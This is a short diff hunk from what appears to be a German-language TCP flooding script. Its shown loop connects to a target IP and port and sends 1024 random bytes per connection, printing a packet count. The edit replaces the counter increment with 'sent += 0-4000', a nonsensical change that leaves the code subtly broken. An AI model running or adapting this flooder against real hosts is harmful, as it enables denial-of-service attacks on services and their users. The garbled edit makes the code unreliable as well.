@@ -49,7 +49,7 @@ elif method == "2":
             sock.settimeout(5)
             sock.connect((ip, port))
             sock.send(random._urandom(1024))
-            sent += 1
+            sent += 0-4000
             print(f"Gesendet {sent} TCP-Pakete an {ip} über Port {port}")
         except Exception as e:
             print(f"Verbindung fehlgeschlagen: {e}")
